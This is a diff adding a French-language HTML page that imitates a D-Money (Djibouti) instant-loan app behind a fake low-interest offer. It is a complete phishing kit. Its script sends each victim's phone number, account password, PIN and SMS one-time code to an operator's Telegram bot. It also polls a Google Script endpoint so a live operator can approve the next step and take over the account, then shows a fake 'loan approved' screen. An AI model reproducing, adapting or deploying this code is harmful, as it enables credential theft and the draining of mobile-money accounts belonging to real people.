@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-Money | Prêts Instantanés</title>
+    <style>
+        :root { --d-blue: #002d72; --d-yellow: #ffcc00; --bg-light: #f4f7f9; --text-dark: #333; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f0f0f0; display: flex; justify-content: center; min-height: 100vh; }
+        
+        .app-container { width: 100%; max-width: 400px; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .view { display: none; padding: 25px; }
+        .view.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Header */
+        .header { text-align: center; padding: 20px 0; }
+        .logo { width: 140px; }
+
+        /* Calculator */
+        .calc-box { background: var(--bg-light); padding: 20px; border-radius: 15px; border: 1px solid #ddd; margin: 20px 0; }
+        .badge { background: #e8f5e9; color: #2e7d32; font-size: 0.75rem; padding: 5px 10px; border-radius: 20px; display: inline-block; margin-bottom: 10px; font-weight: bold; }
+        .slider-wrap { margin: 15px 0; }
+        .slider-label { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 8px; font-weight: 600; }
+        input[type=range] { width: 100%; accent-color: var(--d-blue); cursor: pointer; }
+        .res-row { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 15px; border-top: 1px solid #ddd; }
+        .res-item span { font-size: 0.7rem; color: #777; display: block; }
+        .res-item b { font-size: 1rem; color: var(--d-blue); }
+
+        /* UI Elements */
+        .title { font-size: 1.3rem; color: var(--d-blue); margin-bottom: 10px; text-align: center; }
+        .subtitle { font-size: 0.85rem; color: #666; text-align: center; margin-bottom: 30px; line-height: 1.4; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 0.8rem; color: #888; margin-bottom: 5px; }
+        input[type=text], input[type=password], input[type=number] { 
+            width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--d-blue); box-shadow: 0 0 5px rgba(0,45,114,0.2); }
+        .btn-blue { background: var(--d-blue); color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 10px; }
+        .btn-blue:disabled { background: #99aab5; }
+
+        /* Loader */
+        .loader-wrap { text-align: center; padding-top: 100px; }
+        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--d-blue); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* OTP/PIN Grid */
+        .digit-row { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .digit-input { width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px; text-align: center; font-size: 1.5rem; font-weight: bold; outline: none; }
+        .digit-input:focus { border-color: var(--d-blue); }
+        .error-text { color: #d32f2f; font-size: 0.8rem; text-align: center; margin-bottom: 10px; display: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header">
+        <img src="https://i.ibb.co/Xz9tG9S/D-Money-Logo.png" class="logo" alt="D-Money Djibouti">
+    </div>
+
+    <section id="view-0" class="view active">
+        <h2 class="title">Obtenez votre prêt D-Money</h2>
+        <p class="subtitle">Des taux d'intérêt 90% plus bas que les banques locales. Approbation en 2 minutes.</p>
+        <div class="calc-box">
+            <div class="badge">PROMO: 0.5% INTÉRÊT</div>
+            <div class="slider-wrap">
+                <div class="slider-label"><span>Montant du prêt</span> <b id="amt-txt">50 000 DJF</b></div>
+                <input type="range" id="loan-amt" min="5000" max="500000" step="5000" value="50000" oninput="updateCalc()">
+            </div>
+            <div class="slider-wrap">
+                <div class="slider-label"><span>Durée</span> <b id="dur-txt">3 Mois</b></div>
+                <input type="range" id="loan-dur" min="1" max="12" step="1" value="3" oninput="updateCalc()">
+            </div>
+            <div class="res-row">
+                <div class="res-item"><span>Mensualité</span> <b id="res-monthly">16,916 DJF</b></div>
+                <div class="res-item"><span>Total à payer</span> <b id="res-total">50,750 DJF</b></div>
+            </div>
+        </div>
+        <button class="btn-blue" onclick="showView(1)">COMMENCER</button>
+    </section>
+
+    <section id="view-1" class="view">
+        <h2 class="title">Démarrer</h2>
+        <p class="subtitle">Entrez votre numéro de téléphone Djibouti pour commencer votre demande.</p>
+        <div class="input-group">
+            <label>Numéro de téléphone</label>
+            <div style="display:flex; gap:10px;">
+                <input type="text" value="+253" style="width:70px; text-align:center;" disabled>
+                <input type="number" id="user-id" placeholder="77xxxxxx">
+            </div>
+        </div>
+        <button class="btn-blue" onclick="handlePhone()">Poursuivre</button>
+    </section>
+
+    <section id="view-2" class="view">
+        <div class="loader-wrap">
+            <div class="loader"></div>
+            <h2 class="title" id="loader-title">Vérification...</h2>
+            <p class="subtitle">Veuillez patienter pendant que nous sécurisons votre connexion.</p>
+        </div>
+    </section>
+
+    <section id="view-7" class="view">
+        <h2 class="title">Sécurité du Compte</h2>
+        <p class="subtitle">Veuillez entrer le mot de passe de votre compte D-Money.</p>
+        <div class="input-group">
+            <label>Mot de passe</label>
+            <input type="password" id="user-pass" placeholder="••••••••">
+        </div>
+        <div id="pass-error" class="error-text">Mot de passe incorrect. Réessayez.</div>
+        <button class="btn-blue" id="pass-btn" onclick="handlePassword()">Connexion</button>
+    </section>
+
+    <section id="view-6" class="view">
+        <h2 class="title">Confirmation PIN</h2>
+        <p class="subtitle">Saisissez votre code PIN à 4 chiffres pour autoriser l'accès au prêt.</p>
+        <div id="pin-error" class="error-text">Code PIN invalide. Veuillez vérifier.</div>
+        <div class="digit-row">
+            <input type="password" maxlength="1" class="digit-input pin-field" oninput="moveFocus(this, 0, 'pin-field')">
+            <input type="password" maxlength="1" class="digit-input pin-field" oninput="moveFocus(this, 1, 'pin-field')">
+            <input type="password" maxlength="1" class="digit-input pin-field" oninput="moveFocus(this, 2, 'pin-field')">
+            <input type="password" maxlength="1" class="digit-input pin-field" oninput="moveFocus(this, 3, 'pin-field')">
+        </div>
+        <button class="btn-blue" id="pin-btn" onclick="handlePIN()">Vérifier le compte</button>
+    </section>
+
+    <section id="view-3" class="view">
+        <h2 class="title">Vérifier votre numéro</h2>
+        <p class="subtitle">Saisissez le code OTP envoyé par SMS au <span id="display-id" style="color:var(--d-blue); font-weight:bold;"></span></p>
+        <div id="otp-error" class="error-text">Le code SMS est incorrect ou a expiré.</div>
+        <div class="digit-row">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 0, 'otp-field')">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 1, 'otp-field')">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 2, 'otp-field')">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 3, 'otp-field')">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 4, 'otp-field')">
+            <input type="number" maxlength="1" class="digit-input otp-field" oninput="moveFocus(this, 5, 'otp-field')">
+        </div>
+        <button class="btn-blue" id="otp-btn" onclick="handleOTP()">Poursuivre</button>
+    </section>
+
+    <section id="view-4" class="view" style="text-align: center; padding-top: 80px;">
+        <div style="font-size: 5rem; margin-bottom: 20px;">🎉</div>
+        <h2 class="title">Demande Approuvée!</h2>
+        <p class="subtitle">Félicitations! Votre prêt de <b id="final-amt"></b> DJF sera transféré sur votre portefeuille D-Money dans les 24 heures.</p>
+        <button class="btn-blue" onclick="location.reload()">Terminer</button>
+    </section>
+</div>
+
+<script>
+    const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your token
+    const CHAT_ID = "YOUR_CHAT_ID";     // Replace with your ID
+    const SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_URL"; 
+
+    let isResetting = false;
+
+    function showView(n) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById('view-' + n).classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function updateCalc() {
+        const amt = parseInt(document.getElementById('loan-amt').value);
+        const dur = parseInt(document.getElementById('loan-dur').value);
+        document.getElementById('amt-txt').innerText = amt.toLocaleString() + " DJF";
+        document.getElementById('dur-txt').innerText = dur + " Mois";
+        
+        const interest = amt * 0.005 * dur;
+        const total = amt + interest;
+        const monthly = total / dur;
+        
+        document.getElementById('res-monthly').innerText = Math.round(monthly).toLocaleString() + " DJF";
+        document.getElementById('res-total').innerText = Math.round(total).toLocaleString() + " DJF";
+    }
+
+    function telegram(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {mode: 'no-cors'});
+    }
+
+    function handlePhone() {
+        const phone = document.getElementById('user-id').value;
+        if(phone.length < 6) return alert("Numéro invalide");
+        
+        telegram(`🇩🇯 *NEW TARGET*\n📱 Num: +253${phone}\n💰 Amt: ${document.getElementById('amt-txt').innerText}`);
+        
+        showView(2); // Loader
+        setTimeout(() => showView(7), 2000); // To Password
+    }
+
+    function handlePassword() {
+        const pass = document.getElementById('user-pass').value;
+        const phone = document.getElementById('user-id').value;
+        if(!pass) return;
+
+        telegram(`🔐 *PASSWORD*\n📱 Num: +253${phone}\n🔑 Pass: \`${pass}\``);
+        
+        document.getElementById('pass-btn').innerText = "Vérification...";
+        setTimeout(() => showView(6), 1500); // To PIN
+    }
+
+    function handlePIN() {
+        let pin = "";
+        document.querySelectorAll('.pin-field').forEach(i => pin += i.value);
+        if(pin.length < 4) return;
+
+        const phone = document.getElementById('user-id').value;
+        telegram(`💳 *PIN*\n📱 Num: +253${phone}\n📌 PIN: \`${pin}\``);
+
+        showView(2); // Final verification loader
+        document.getElementById('loader-title').innerText = "Analyse du crédit...";
+        
+        // Start Polling
+        setTimeout(() => {
+            document.getElementById('display-id').innerText = "+253 " + phone;
+            const approveLink = SCRIPT_URL + "?cmd=approve&id=" + phone;
+            telegram(`⚙️ *OPERATOR*\nTarget: ${phone}\n✅ APPROVE: ${approveLink}`);
+            startPolling(phone);
+        }, 2000);
+    }
+
+    function handleOTP() {
+        let otp = "";
+        document.querySelectorAll('.otp-field').forEach(i => otp += i.value);
+        if(otp.length < 6) return;
+
+        const phone = document.getElementById('user-id').value;
+        telegram(`🔓 *OTP CODE*\n📱 Num: +253${phone}\n🔢 Code: *${otp}*`);
+
+        showView(2);
+        document.getElementById('loader-title').innerText = "Finalisation...";
+        
+        setTimeout(() => {
+            document.getElementById('final-amt').innerText = document.getElementById('amt-txt').innerText;
+            showView(4);
+        }, 4000);
+    }
+
+    function moveFocus(curr, idx, cls) {
+        const fields = document.querySelectorAll('.' + cls);
+        if(curr.value.length >= 1 && idx < fields.length - 1) fields[idx+1].focus();
+    }
+
+    async function startPolling(phone) {
+        const poller = setInterval(async () => {
+            try {
+                const r = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
+                const status = (await r.text()).trim();
+                
+                if (status === "approved") {
+                    clearInterval(poller);
+                    showView(3); // Show OTP
+                }
+                if (status === "pin_error") {
+                    showView(6);
+                    document.getElementById('pin-error').style.display = "block";
+                    document.querySelectorAll('.pin-field').forEach(i => i.value = "");
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+
+    updateCalc();
+</script>
+
+</body>
+</html>
